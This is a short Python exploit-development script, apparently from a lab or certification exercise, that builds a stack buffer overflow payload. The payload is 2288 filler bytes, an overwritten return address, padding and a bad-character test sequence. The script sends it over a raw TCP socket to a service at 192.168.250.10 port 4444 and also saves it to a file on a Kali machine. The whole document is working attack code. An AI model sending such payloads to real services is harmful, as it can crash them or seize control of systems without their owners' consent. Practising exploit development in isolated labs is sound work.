import socket
from time import sleep

from more_itertools import difference

buf = b"a"*2288
buf += b"\xcf\x10\x80\x14"
buf += b"c"*8




bad=[0,0x0a,0x1a]




for i in range(256):
    if(i not in bad):
        buf += i.to_bytes(1,'little')


print(buf)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
s.connect(("192.168.250.10", 4444))
s.send(buf)
sleep(2)
s.close()

file = open("/home/kali/exploit.txt","wb")
file.write(buf)
file.close

